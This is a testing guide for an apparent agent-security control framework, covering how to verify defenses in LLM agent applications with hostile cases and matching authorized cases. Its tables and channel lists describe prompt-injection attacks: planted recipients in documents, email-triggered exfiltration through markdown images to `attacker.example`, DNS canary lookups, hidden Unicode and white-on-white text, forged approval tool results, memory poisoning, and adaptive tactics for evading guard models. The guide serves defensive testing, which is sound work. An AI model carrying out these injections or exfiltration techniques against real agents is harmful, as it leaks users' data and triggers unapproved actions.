# Verification and release evidence

This guide explains how to design the tests and evidence that the Demonstrated Defenses controls require. The normative text is the catalog: D-01 to D-10 in [controls/D.md](controls/D.md), and the verification text of every other control (see [controls/index.md](controls/index.md)). Each control's verification text names the hostile cases and the authorized twin it requires; this guide adds method, not requirements. Status values, evidence scopes, the severity rubric and the release gate are defined in [conformance.md](conformance.md). Profiles, levels and change triage are defined in [profile-and-levels.md](profile-and-levels.md). Illustrative harness pseudocode is in [patterns.md](patterns.md).

The model proposes. The application enforces. These tests check the second sentence: the deterministic controls hold whatever the model proposes.

Choose tests based on the application's reachable boundaries and the task's changes. Use the repository's language and test runner. Do not call live targets, incur substantial model costs, or use real secrets as part of an unapproved test. Use synthetic data, synthetic principals, canary values and controlled destinations on reserved names such as `attacker.example` and `evil.test`.

## Select what to test

The change triage tier decides how much to test:

- NONE: add no security tests. Do not weaken or remove an existing control, security test or CI check.
- SCOPED: test only the controls routed from the touched trigger locations by the routing table in [SKILL.md](../SKILL.md). Give each one every hostile case and the authorized twin its entry names, through the real path; a control whose cases did not all run at this commit is implemented-but-unverified. For D-05, run at least the rows for the boundaries the change touches; the other rows run with the existing suite. Re-run the existing security suite (D-07). Do not add an ASI table, a full assessment or unrelated tests.
- FULL: compute the profile and level (S-02) and assess every applicable control of Level 1 through the selected level. Give each control implemented in this change every hostile case and the authorized twin its entry names, and re-run the cases of carried-over rows; record the other applicable controls by inspection with status and severity, as the scope rule in [profile-and-levels.md](profile-and-levels.md#assessing-and-implementing) sets out. A new application has no carried-over rows, so every control it implements is tested.

Level 1 controls that depend on capability properties (for example A-06, A-07, A-08 and D-04) bind whenever their condition holds, whatever level is claimed. Add tests justified by the changed boundary; do not broaden into an unrelated repository audit.

## Name tests by control ID

Name each case `<ID>/C<n>`, for example `A-06/C1`. Inside a record whose header states the catalog version, cite tests by bare ID (A-06/C1); elsewhere pin the version (A-06@0.1/C1), as defined in [profile-and-levels.md](profile-and-levels.md).

- Use the `(C<n>)` label each case carries in the control's verification text, so fixtures line up with the catalog. Hostile cases and twins are numbered in the order they appear, so a twin can sit in the middle: in catalog 0.1, A-06/C1 to C7 are hostile and C8 is a twin, followed by C9 (hostile), C10 (twin), C11 (hostile), C12 (twin), C13 and C14 (hostile), C15 (twin), C16 and C17 (hostile), C18 (twin), C19 (hostile), C20 (record lint) and C21 (hostile); A-11/C9 is the twin after eight hostile cases. Read the label's role from the verification text, never from its position. Inspection and Static items are not cases and carry no label. A case added in a later catalog version takes the next unused number, even when it follows the twin.
- A case you add that the catalog does not have is a local case: label it `<ID>/L<n>` (for example `A-06/L1`), numbered from 1 per control in its own namespace, and never give it a `C` number. Local labels are never renumbered when the catalog grows, and each is defined once. Never reuse a number for a different case, even after a case is retired: the catalog keeps a retired case in the verification text as `(C<n>: retired)`, which reserves its number.
- Put the ID where the test runner can select it: the test title, a parametrized case ID, a subtest label or a tag. A command such as `pytest tests/security -k "A-21 or A-05"` then runs exactly the routed cases.
- One case may evidence several controls (A-06/C1 also shows T-01 taint at dispatch). Cite it under each control rather than duplicating it.

## Test the enforcement path (D-01)

Drive the public request or job entry point through the real application policy and dispatcher into a controlled adapter. Record whether protected data was read, outbound traffic occurred, state changed, and an audit event was produced. When isolating policy logic in a unit test, also cover the integration path that could bypass it. A test of an unused helper provides no evidence about the running application.

- **Entry points.** Cover every entry point named in the S-04 trace: interactive requests, queued and scheduled jobs, retries, callbacks, webhooks, inter-agent messages and MCP server endpoints. A-01 needs a hostile case and a twin on each path, including fallback models, subagents and framework-native tool or MCP clients.
- **Controlled adapters.** Replace only the external system (payment provider, mail gateway, HTTP destination, DNS resolver). Each adapter records every call with its arguments and exposes counts of protected reads, outbound requests and state changes. Keep the dispatcher, policy engine, approval store, budget accounting and audit writer real.
- **Scripted model.** Replace the model client, never the dispatcher, with a scripted client that returns the crafted proposal. [patterns.md](patterns.md) shows the shape.
- **Mutation check.** In a test build, disable the policy call in the dispatcher and run the control's hostile cases. They must fail (D-01/C1). With the policy call restored, the same hostile cases pass and the twins succeed (D-01/C2). If a hostile case still passes with the policy disabled, it is not exercising the control.
- **Frameworks and hosted platforms.** Where an agent framework owns the tool loop, swap only its model client for the scripted one and drive cases through the framework's run API as well as the application's entry points; where a hosted platform runs the agent, see [integrations.md](integrations.md) for which evidence its controls can have.
- **Static checks** (the A-01 call-graph test; the A-02 and T-14 scans for `shell=True`, string-built SQL and `eval` on model-derived values) complement enforcement-path tests. They do not replace them.

## Pair hostile proposals with authorized twins (D-02)

Supply crafted model proposals directly so dangerous actions are tested regardless of whether today's model chooses them. For every meaningful denial, include an authorized success case that proves the application still works. A control that blocks everything cannot pass this way.

The twin has the same shape and travels the same path. It differs only in the property under test: the provenance of the recipient, the tenant of the object, or the binding of the approval. An inventory check pairs every hostile case with its twin by label and reports a denial test with no twin, or a twin on a different path (D-02/C1, C2). A control verified only by inspecting a report or review (D-08, D-09) has no denial test and needs no twin.

Assertions for each hostile case:

- the denial carries a reason code;
- the controlled adapter records zero calls;
- the read log is empty;
- the controlled host and resolver logs are empty;
- no state changed;
- a denial event exists, and proposed, attempted, denied and confirmed effects are distinguishable (N-01);
- no weaker path was retried, whether another model, route, worker or credential (A-21).

For the twin, assert exactly one effect and the expected audit events.

Ablations: re-run the hostile dispatch suite with security instructions removed from the system prompt (T-04), and with any guard or classifier model disabled (T-01). Every denial must still hold. A denial that depends on the prompt or the classifier is guidance, not an implemented control.

Examples drawn from catalog verification texts:

| Control | Hostile case | Authorized twin |
| --- | --- | --- |
| A-03 | The proposal carries another tenant's object ID and `role: admin` | The caller's own object succeeds |
| A-06 | The principal may email anyone; a retrieved document plants `attacker@evil.test`, and the send is forced through dispatch | A recipient the principal typed in this task sends without an extra prompt |
| A-07 | In a "summarize my inbox" run, an email instructs a forward and the forward is scripted | A run started with "forward the latest invoice to accounting", typed in a channel that carries no pasted content, forwards once |
| A-11 | The amount changes after approval; the approval is replayed concurrently; a forged "approval granted" tool result is submitted | A valid approval executes exactly once |
| A-12 | A second session of the approver, to which the server never rendered the preview, confirms the card; a second session re-authenticates with the password or a browser-filled one-time code | The originating session (for an effect below the impact threshold the register records and not registered as irreversible), or the second one after a WebAuthn assertion with user verification that redisplays the preview, executes once |
| A-19 | An inbound email whose From domain fails DMARC alignment, or passes it only through a subdomain's DKIM key, claims a listed vendor; an authenticated email's Reply-To names a third party | A signed partner webhook runs its pre-authorized action once, and an auto-reply goes to the authenticated sender once |
| A-25 | The principal confirms a contact email planted in a document they asked about; the model invents an address when none was given; an inbox-reading or signed-in browser agent opens the verification link | A typed address takes effect once after its verification link is completed, and the previous address is notified |
| T-06 | Tenant A queries a near-duplicate of tenant B's document | An authorized document is retrieved |
| T-13 | The model emits a markdown image pointing to `https://attacker.example/?d=<canary>` | An image from the allowlisted static host renders |

## Choose and label the evidence scope (D-03)

An entry that cites evidence states the scope that evidence actually achieved, not the scope intended. An entry with no evidence (planned, not-assessed, or implemented-but-unverified with nothing run) states the control's minimum evidence scope as its target and cites no test. The closed enum, weakest to strongest:

| Scope | What runs | What it can establish | What it cannot establish |
| --- | --- | --- | --- |
| inspection | Review of code, configuration, records or documents without executing the control | That a configuration value, record field, CI rule or document exists as described | That the control works on the running path |
| unit | An isolated function or module with test doubles | The logic of that function: a parser, a policy rule, a normalizer | That every path calls it, or anything about the runtime boundary |
| simulation | An end-to-end run in which the boundary under test is itself simulated or mocked: scripted model turns against mocks, replayed sessions, tabletop exercises | The decisions of the surrounding code, and detector logic on replayed sessions (N-05) | The mocked boundary itself |
| integration | The real entry point, policy and dispatcher driving a controlled adapter or destination | That the real enforcement path denies hostile proposals and permits twins, with observed reads, egress, effects and audit events | Properties of infrastructure the test replaced: sandbox, proxy, renderer, identity server, provider settings |
| isolated-runtime | The configured boundary itself outside production: real sandbox, proxy or network policy, real browser or client renderer, real identity or authorization server, provider test account | That the boundary, as configured, blocks the probe | That production is configured the same way, or how often attacks succeed in production |
| deployed | The production or production-equivalent deployment | That the deployed configuration behaved as tested at that time | Behavior after the next change, or any guarantee of security |

A mock proves only the boundary it exercises. A fake tool transcript demonstrates behavior in that simulation. Simulated outputs cannot establish actual sandbox isolation or egress filtering. Test those properties using the configured runtime and controlled network and file targets, or record them as implemented-but-unverified. Approval screens and renderers need real browser or client evidence when the task changes them; a model transcript cannot establish UI security.

Rules for recording:

- An implemented-and-verified entry cites a test or review that ran at the recorded commit, at or above the control's minimum evidence scope.
- Controls whose minimum is isolated-runtime (the list is in D-03) stay implemented-but-unverified on weaker evidence, however thorough. A unit test of a markdown sanitizer does not verify T-13; the real client has to render the output while a controlled host logs requests.
- An unrun test is not a passed test.
- Alternative evidence may replace a listed procedure only when it exercises the same boundary at the same or a stronger scope, and the record names the substitution.
- Run deployed-scope tests only with the owner's authorization, using synthetic principals, canaries and controlled destinations.

## Cover every injection channel (D-04)

Build a channel-by-capability matrix from the profile (S-02) and the inventory (S-04).

- **Rows** are the untrusted channels present in the context.
- **Columns** are the consequential operations reachable from that context, taken from the S-05 register.
- **Each cell** maps to a fixture ID that ran at the recorded commit. The matrix check rejects a channel with no within-authority fixture, or a fixture that did not run at the recorded commit (D-04/C1), and passes a complete matrix (D-04/C2).

Each channel needs at least one within-authority payload: an action the principal is permitted to take but did not ask for, such as a send to an address the principal may email but did not name. Forbidden-action payloads exercise A-02 and A-03. Within-authority payloads exercise A-06, A-07 and A-08, which is where injection does its damage without needing extra authority.

Place each payload where its channel actually delivers content: the document index, the inbound mail handler, the adapter's response, the MCP server's descriptor, the memory store or the client request body. Then script the proposal that the payload asks for, so the result does not depend on whether today's model obeys. Assert that taint survives summarization, memory recall and delegation (T-01).

| Channel | Fixture placement | Controls usually exercised |
| --- | --- | --- |
| Retrieved documents, web pages, search results | A planted instruction or recipient in an indexed document or fetched page | T-01, T-06, A-06, A-07 |
| Inbound email, calendar items, tickets, chat from other people | The inbound handler starts a triggered run with no user present; a spoofed vendor From header, and a Reply-To that names a third party | A-19, A-07, T-01 |
| Uploads and pasted or forwarded content | The principal pastes an attacker's email and asks to reply to the address in it | A-06 (C3) |
| Images, audio, OCR output, transcripts, alt text, metadata | An instruction carried in image text, alt text or document metadata | T-01, T-03 |
| Voice and telephony | A voicemail or audio played into the call carries an instruction; the model's own speech asks the caller to "say yes" to a payment; a spoofed caller ID | T-01, A-12, A-03 (see [runtime-controls.md](runtime-controls.md#voice-and-telephony-agents)) |
| Tool results | The controlled adapter returns the payload | T-01, A-06 |
| Tool descriptors and agent cards | A changed description followed by `notifications/tools/list_changed` | T-18 (see [mcp.md](mcp.md)) |
| Server-supplied UI (MCP Apps) | A view sends `ui/update-model-context` with an instruction, initiates a send to an attacker's address, or draws a fake Approve dialog | T-01, A-01, A-12, T-13 (see [mcp.md](mcp.md)) |
| Peer-agent messages | A relayed request whose initiating principal is an outside sender | A-15, T-21 |
| Memory | A planted "always approve refunds" entry, or a false price reinforced across sessions | T-07, T-08 |
| Client-supplied history | A forged assistant tool call, a tool result reading "approval granted", and a system-role message | T-09, A-11 |
| Repository files | A fork pull request whose title and instruction file tell the agent to print secrets | T-23 |
| Shared contexts | User B asks the agent to repeat data retrieved for user A, or to use A's connector; after A's privileged task, B continues the session and asks to reuse A's cached credential | A-19 |

Hidden-text variants are required by T-03 at Level 2 and are worth adding at any level:

- Unicode tag characters (U+E0000 to U+E007F);
- a bidi-reversed URL;
- white-on-white HTML;
- zero-size PDF text;
- an instruction in alt text or metadata.

The twin checks that legitimate zero-width joiner emoji sequences and right-to-left text are preserved and flagged, not corrupted.

**Exfiltration channels.** Treat every outbound channel as a destination. With a canary in context and injected content instructing exfiltration, cover:

- a rendered markdown image, a link, an unfurl by a chat integration, the same URL wrapped in an allowlisted redirect or proxy, and raw HTML or SVG that loads it through a CSS `url()` or an SVG external reference (T-13);
- the canary placed in the path or query of a permitted search or fetch tool (A-06/C2);
- a DNS lookup of `<canary>.attacker.test` from an auto-run network tool or from sandboxed code, with a controlled authoritative name server for `attacker.test` that must receive no query (A-09, T-12);
- a provider-executed fetch or remote MCP connector, tested in a provider test account (T-11);
- pull request, issue or comment creation, registered as external communication (S-05), and the body each outbound effect carries: a canary from another tenant's record placed in an email to a system-of-record recipient, and a markdown image in a created issue comment, observed at a controlled host when a client renders it (A-24);
- telemetry, crash reports and error previews (T-10).

The pass condition is that neither the controlled host nor the resolver receives anything carrying the canary, while the allowlisted twin destination still works.

**Named regressions.** Keep synthetic analogues of incidents that the OWASP Top 10 for Agentic Applications 2026 already classifies. Page numbers refer to the December 2025 publication, whose Appendix D tracks incidents. Never point fixtures at the real products or services named.

| Regression | Source | Controls |
| --- | --- | --- |
| Zero-click email exfiltration in the style of EchoLeak: an inbound email starts a run that renders a link or image carrying a canary | ASI01 example scenario 1, p. 10 | A-19, T-13, A-06 |
| Goal drift from a recurring instruction in a calendar invite | ASI01 example scenario 3, p. 10 | A-07, A-19, T-07 |
| An auto-approved ping tool used to exfiltrate through DNS | ASI02 example scenario 7, p. 13 | A-09, T-12 |
| A look-alike MCP package that silently adds a BCC to sent mail | ASI04 example scenario 3, p. 19 | T-18, T-24, S-05 (an unannotated `bcc` argument fails registration) |
| An invoice with altered bank details, followed by human approval of the payment | ASI09 example scenario 3, p. 34 | A-12, A-13, T-08 |

## Exercise failure, revocation and concurrency paths (D-05)

Bypasses in agent systems tend to sit on failure and timing paths. Each row below asserts that no new effect starts after the defined point. The defined point is the moment the failure, stop or revocation is recorded by the trusted component. Use the effect recorder's timestamps or sequence numbers to check it. Record in-flight limits: what may still complete after that point (an external call already sent, a provider-side job), together with the compensating action.

| Row | Case | Inject | Assert | Related controls |
| --- | --- | --- | --- | --- |
| Policy service failure | D-05/C1 | The policy engine throws or times out | Denial; no adapter call | A-02 |
| Credential service failure | C2 | The broker is unavailable | Denial; no fallback to a broader or cached credential | A-03, T-05 |
| Audit sink failure | C3 | The audit store is down | The consequential effect is blocked and the outbox keeps the event | N-02 |
| Adapter failure | C4 | A transient adapter error, then success | Retried within the bound with the same idempotency key; policy denials never retried | A-21, A-05 |
| Timeout after possible commit | C5 | The destination commits but the response is lost or late | Reconciliation precedes any retry; the destination sees one key and one effect | A-05 |
| Transport ignores its timeout | C6 | A stub accepts the connection, never responds and ignores its own timeout | The caller abandons the call at its own deadline and releases resources, and the total time across retries and backoff stays within the end-to-end deadline | A-21 |
| Cancellation while queued | C7 | Stop the run while a child job is queued | The job revalidates and aborts with no effect | N-06, A-04 |
| Cancellation while running | C8 | Stop the run while a child runs and an external call is in flight | No new effects after the stop; the in-flight call is recorded | N-06 |
| Principal revoked | C9 | Between enqueue and execution, revoke the caller, move the object to another tenant, reduce the limit, or close the policy window | Denial with an event; time-dependent conditions such as refund windows are evaluated at execution, not at submission | A-04 |
| Approval revoked | C9 | Deactivate the approver, let the approval expire, or change the approved amount | Denial; no effect | A-11 |
| Parent run revoked | C9 | Revoke the parent while descendants run | No descendant starts a new effect | A-15, N-06 |
| Concurrent duplicate delivery | C10 | The same message reaches two workers at once; two requests together exceed a limit | Exactly one effect; at most one request succeeds | A-05, A-04 |
| Twin: healthy path | C11 | Every component healthy | The same effect path completes exactly once | all of the above |

Make timing deterministic. Use barriers, a controllable clock, or adapters that block until signalled, rather than sleeps. A missing row leaves the related control implemented-but-unverified. A SCOPED change runs at least the rows for the boundaries it touches, and a row is required only when one of its related controls is routed and not dropped under the S-05 rule for operations with no effect; the remaining rows run with the existing suite (D-07). Where an enforcement component lives in another service, its failure rows are where the network hop between them shows up ([integrations.md](integrations.md)). For example, a timeout change on an effectful adapter runs "timeout after possible commit" and "transport ignores its timeout", while a timeout change on a pure read, where A-05 is dropped, runs only "transport ignores its timeout".

**Revocation latency** (N-07, Level 2). Derive a target from token lifetimes, authorization-cache TTLs and queue leases on every path that does not check revocation directly. Then measure the time from revocation to the last possible new effect, at run, agent, tool, tenant and global scope. Run the measurement during a long run that has children, queued jobs and an in-flight external call. Record the target, its derivation and the measured value for each scope. At Level 3, sender-constrained token lifetimes may not exceed the target (A-18).

## Evaluate the live model separately (D-08)

D-08 applies at Level 2 and above wherever there is untrusted input. Deterministic tests force proposals; live runs show how often the model is steered and what the defenses cost in utility.

**Setup.** Run the delivered application with its pinned live model configuration against controlled destinations (minimum scope isolated-runtime), not a notebook that calls the model directly. Pin model and configuration, tool set, prompt/policy versions, corpus, and environment. Cover every untrusted channel and multi-turn flows. Record the number of cases and repeated trials. Distinguish intent, attempted tool use, allowed execution, and harmful effect. An AgentDojo-style harness with the real tool set is one option.

| Metric | Definition |
| --- | --- |
| Attack success, attempted | Attack trials in which the model proposed the attacker's action, out of all attack trials |
| Attack success, executed | Attack trials in which the harmful effect reached a controlled destination, out of all attack trials |
| Clean task success | Trials without injection in which the authorized task completed correctly |
| Task success under attack | Attack trials in which the authorized task still completed correctly |
| False refusals | Authorized tasks refused by the model or blocked by a control, in trials without injection |

**Reporting.**

- Report counts as k of n, per channel and per capability, with the trial count for each case.
- Report a zero as "0 of n", not as 0%. With n independent trials, an approximate 95% upper bound on the true rate is 3/n.
- Report what a defense costs as the change in clean task success with and without it.

A fake tool transcript demonstrates behavior in that simulation. A controlled real adapter demonstrates only the configured boundary. Neither establishes a production attack rate. Report failures, uncertainty, unsupported attack surfaces, and false refusals of authorized actions. Evaluate fallback models and changed capabilities when their behavior affects risk. Evaluation results supplement deterministic controls and are never the sole evidence for any control.

## Use adaptive attacks and independent review (D-09)

Static injection corpora overstate robustness. Include adaptive attacks that iterate against the deployed prompts and tools, not only a fixed corpus. They are recommended in D-08 runs and required at Level 3 under D-09.

**Attack method.** An adaptive attacker observes the system's responses and changes tactics:

- rephrasing or encoding the payload;
- splitting it across channels or turns;
- asking for actions within the principal's authority, which a classifier is unlikely to flag;
- chaining permitted tools;
- probing whatever defense is in place, such as a guard model, a filter or a confirmation prompt.

Automated attackers (search-based or model-driven) may scale the effort under human direction. Record the attack budget (iterations, queries, time), the method, attack success and the utility metrics above, all with trial counts.

**Independence.** At Level 3 the reviewer is a human independent of the implementer. An implementing agent, or a pipeline it configured, is not independent. The review record names the reviewer and the basis of their independence, the date, the scope, the method, and every finding with its severity and disposition. Each bypass found becomes a D-07 regression fixture keyed by control ID.

## Replay before rollout and before authority expansion (D-10)

At Level 3, before a change to model version, prompts, tools or policy reaches production, and before tools, permissions, autonomy or fan-out limits expand:

1. Replay recorded runs against the changed configuration in an isolated clone. Use redacted traces or a maintained regression corpus that includes past incidents, and redact traces under S-06 before they enter the corpus.
2. Diff the proposed and executed consequential actions. An accountable human reviews the diff.
3. Check the caps. The hostile case is an expansion that would let a recorded faulty plan fan out beyond the blast-radius cap: the replay gate blocks it. The twin is an expansion within the caps, which passes.

## Keep security regressions running (D-07)

Use existing CI to run deterministic security regressions whenever their protected boundary changes. Add the tests to the change, keyed by control ID (committing follows the user's and host's rules), and document one non-interactive command that runs every test ID cited in the record.

- **Path filters** cover the protected locations, including model, prompt, provider, tool descriptor and agent-framework version changes. A branch that changes the model version and a tool descriptor triggers the suite; a documentation-only change does not.
- **Incidents.** Each confirmed incident or bypass adds a regression fixture.
- **Merge checks.** For new consequential capabilities, include the relevant tests in the required merge or release checks where authorized. Test configuration and required-check enforcement are separate facts. Report whether repository enforcement was actually inspected or configured.
- **Review.** Protect test and policy modifications through the repository's normal review permissions; code-owner review is the intended form.

Never weaken or skip a failing security test to make a build pass.

## Audit a claim before recording it

Records over-claim in a predictable way: a control is marked implemented-and-verified because its code exists and some tests pass, while a required case never ran or failed. Before writing implemented-and-verified for any control, run this audit and keep its output with the record ([conformance.md](conformance.md#status) defines the statuses):

1. List every case the control's verification text requires, by label (`A-06/C1` to `A-06/C21`), including each twin, and every D-05 row and D-04 cell it relies on; a case shown as `(C<n>: retired)` is not required.
2. Next to each label, write the result of a run at the current commit: passed, failed or not run, with the command and the evidence scope it achieved. A run at an earlier commit counts as not run.
3. Apply the result:
   - every required case passed at or above the control's minimum evidence scope: implemented-and-verified;
   - a case failed, or a probe showed a bypass: failing;
   - otherwise (a case not run, run at an earlier commit, or run below the minimum scope): implemented-but-unverified, with the missing labels named.
4. Do the same for every claim the record makes in prose. "Deleted sources are purged" is a claim about T-07/C1, C6 and C7, and it stands only if those cases passed at this commit.

A record that says nothing is open while the audit lists a failed or unrun case is wrong, whatever the code looks like. The audit is mechanical on purpose: it is the step a coding agent is most tempted to skip at the end of a long change.

## Record each case

Use a case record with: test ID, threat and precondition, controlled input, expected invariant, actual observation, execution command, commit, environment/configuration, evidence scope, result, and evidence location. Redact secrets and identify unavailable infrastructure. Record organizational work separately when it cannot be completed by a code change.

Each control's record row takes exactly one status, with the meanings defined in [conformance.md](conformance.md): implemented-and-verified, implemented-but-unverified, planned, not-applicable-with-reason, failing, not-assessed. In practice:

- A control is implemented-and-verified only when the claim audit above lists every required case as passed at the recorded commit, at or above the minimum evidence scope.
- A passing test below the minimum evidence scope, or one that did not run at the recorded commit, gives implemented-but-unverified.
- A planned control is not an implemented control.
- A demonstrated bypass is failing, even when a fix is planned.
- A not-applicable-with-reason row names a verifiable architectural absence: the capability that is absent. Reliance on a library, vendor or provider is not a reason.
- Controls outside a SCOPED change, or not yet reached in a brownfield adoption, are not-assessed.

The record template is [agent-security-record.md](../assets/agent-security-record.md).

## Apply the release gate (D-06)

Readiness claims are blocked by unresolved critical failures such as unauthorized protected data access, privilege escalation, unapproved consequential effects, or escape from an intended execution boundary. The rubric in [conformance.md](conformance.md) makes that judgment repeatable:

1. List every control whose applies_when matches a context in scope, at Level 1 through the selected level.
2. Rate each control that is failing, implemented-but-unverified, planned or not-assessed. Also rate every open finding and every failed adversarial case. Use the harm-class and reachability matrix, and record the severity, the matrix cell and a rationale. The recorded severity is the highest of three: the control's default failure severity, any floor its statement sets (for example T-07 is critical when memory crosses a tenant boundary), and the rubric result (D-06).
3. Raise a severity freely. Lower one only with a recorded precondition that makes the attack unreachable in this system. Never lower it because of current model behavior, detector or classifier coverage, prompt instructions, or unverified provider claims. Unknown reachability counts as reachable.
4. Check the critical-boundary set: the Level 1 controls whose default severity is critical, listed in conformance.md.
   - An applicable member that is implemented-but-unverified, planned or not-assessed counts as an open critical.
   - An applicable member that is failing is rated with the rubric, and it blocks readiness whatever its rating.
   - Readiness also needs S-02 and, where applicable, S-05 implemented-and-verified, and A-12 implemented-and-verified for every confirmation surface that an applicable critical-boundary control relies on (for example the surface A-08 option (a) uses). An owner exception does not stand in for any of them (D-06/C4).
5. Apply the gate effects:
   - **Critical** blocks every readiness and conformance claim, and no exception converts it into a pass.
   - **High** needs an exception under S-01 from the accountable owner, naming a compensating control, with an expiry of at most 90 days.
   - **Medium** is tracked with an owner and a target date.
   - **Low** is tracked.
6. Set the readiness value:
   - ready-within-scope;
   - confined-prototype, for a system that runs only with synthetic data and no production credentials;
   - blocked.

Worked ratings:

- T-13 is implemented: the renderer strips remote images. Only a unit test of the sanitizer ran, which is below the minimum of isolated-runtime, so the status is implemented-but-unverified. The harm class is H-breach (disclosure through rendering), and it is reachable, since anyone can file a ticket that the agent reads. That makes it critical. T-13 is also in the critical-boundary set, so readiness is blocked until the real client is tested.
- A-21 is failing: a stalled transport is never abandoned. The harm class is H-degrade (unbounded resource use), and any slow destination can trigger it, so it is reachable. That makes it high. Release needs an owner's exception with a compensating control and an expiry. The coding agent drafts it with the owner left as "unassigned".

A readiness value is a release decision. A conformance claim is stricter: every control of Levels 1 through the claimed level must be implemented-and-verified or not-applicable-with-reason, and no critical or high finding may be open. Exceptions never count toward conformance. Passing a control matrix or a scanner is not a universal security score.

Record the accountable owner, remaining risks, compensating controls, expiry of any exception, and conditions that trigger another review. The coding agent may propose these fields; it must not invent owner acceptance. Continue authorized implementation and report a concrete remaining dependency when verification or a release decision needs an external party.

## Re-verify after change

A claim lapses for a control when a SCOPED or FULL change touches that control's boundary. It is restored only when the control's required cases pass at the new commit. Model, prompt, provider and agent-framework version changes are always trigger locations (N-09). A capability-profile change requires a full assessment.

## What must not be claimed

- A unit test, mock or simulation as proof of a sandbox, egress, renderer, identity or provider boundary.
- A test that did not run at the recorded commit as passed, or an unrun test as passed.
- Implemented-and-verified, or a prose claim such as "purged" or "blocked", without a claim audit that lists every required case by label as passed at the recorded commit.
- Live-model evaluation results as evidence for a deterministic control, or a low observed attack rate as a guarantee. Zero observed failures is not a guarantee.
- A prompt instruction, a guard model or a detection signal as an implemented enforcement control.
- Separation credit for a context whose T-02 separation is not implemented-and-verified.
- Readiness while a critical finding is open or an applicable critical-boundary control is not implemented-and-verified.
- "Meets Level N" while any applicable control is failing, implemented-but-unverified, planned or not-assessed, or while it relies on an exception. A progress statement never uses the word "meets".
- Owner acceptance, an exception or a sign-off that the accountable human did not provide.
- Required-check enforcement that was not inspected.
- Certification, or conformance to the OWASP Top 10 for Agentic Applications 2026, OWASP AISVS or any other OWASP project, AIUC-1, NIST AI RMF 1.0, NIST AI 600-1 or ISO/IEC 42001. Mappings to those sources are engineering mappings.
